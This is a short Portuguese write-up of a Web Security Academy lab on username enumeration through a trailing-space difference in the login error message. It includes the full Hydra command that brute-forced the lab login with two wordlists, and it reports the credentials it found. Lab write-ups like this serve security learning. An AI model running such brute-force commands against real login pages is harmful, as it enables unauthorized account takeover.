## Objetivo
account takeover de um alvo onde a substing de retorno das credenciais de login são mensagem genericas como ``Invalid username or password.``

## Vulnerabilidade Identificada
Bom o lab ensina a usar o burp e com o Grep - Extract e direcionar o valor da substring e atacar. depois que o ataque concluir iria achar uma pequena diferença de mensagem com um trailing space.
assim achando o usuario. porém como o exercicio deu as duas listas de wordlist tanto pra senha quanto pra user. e aparentemente n tinha um rate limit eu usei o hydra com as duas listas 


## Metodologia

identifiquei o host com o burp e a substring de retorno, apos isso rodei o hydra com as duas wordlists
## Comandos Utilizados

```bash
hydra -L /home/luweed/Documents/wordusers.txt \
-P /home/luweed/Documents/rockpass.txt \
0a1a00e10448a2e08b96447800380068.web-security-academy.net \
https-post-form \
"/login:username=^USER^&password=^PASS^:Invalid username or password."
```

## Resultado
user: atlanta   password: 2000

## Lições Aprendidas

Grep Extract no Burp captura o texto exato da mensagem e detecta o trailing space — método mais preciso para esse tipo de vulnerabilidade.
e que uma pequena diferença de retorno de substring como um espaço pode abrir oportunidade para um ataque, 
Hydra com duas wordlists, sem F=, funciona porque o redirect 302 na credencial correta não contem a substring de falha.




